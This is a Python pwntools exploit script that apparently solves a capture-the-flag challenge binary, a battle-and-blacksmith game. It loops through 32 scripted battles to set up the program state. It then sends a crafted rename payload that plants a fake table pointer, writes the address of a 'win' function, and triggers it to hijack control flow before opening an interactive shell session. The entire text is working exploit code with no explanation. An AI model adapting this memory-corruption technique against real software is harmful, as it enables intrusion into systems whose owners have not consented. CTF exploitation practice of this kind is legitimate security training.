from pwn import *

elf = ELF("./chall_patched")
context.arch = "amd64"
context.log_level = "debug"

gs = '''
c
'''

win = 0x402476
notif = 0x40e2c0
avt = notif + 0x800000

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

p = start()


for k in range(32):
    p.sendlineafter(b"> ", b"battle")
    for i in range(k + 1):
        answer = (i * i + i + 1) % 3
        p.sendlineafter(
            f"Round {i}> ".encode(),
            str(answer).encode()
        )

        if i == k:
            p.sendlineafter(b"? ", b"no")
        else:
            p.sendlineafter(b"? ", b"yes")
    p.recvuntil(b"Rewards queued: ")
    p.recvline()
    log.info(f"Battle {k + 1}/32")

p.sendlineafter(b"> ", b"battle")
p.sendlineafter(b"Round 0> ", b"0")
p.recvuntil(b"Rewards queued: ")
p.recvline()
p.sendlineafter(b"> ", b"blacksmith")
p.sendlineafter(b"blacksmith> ", b"buy 2")
payload = (
    b"A" * 0x10
    + p64(avt)
    + p64(avt + 0x10)
    + p64(8)
    + p64(0x1000)
    + b"A" * 0x10
)
p.sendlineafter(b"blacksmith> ", b"rename 0 " + payload)
p.sendlineafter(b"blacksmith> ", b"buy 1")
p.sendline(b"rename 1 " + p64(win))
p.sendline(b"inspect 1")
p.interactive()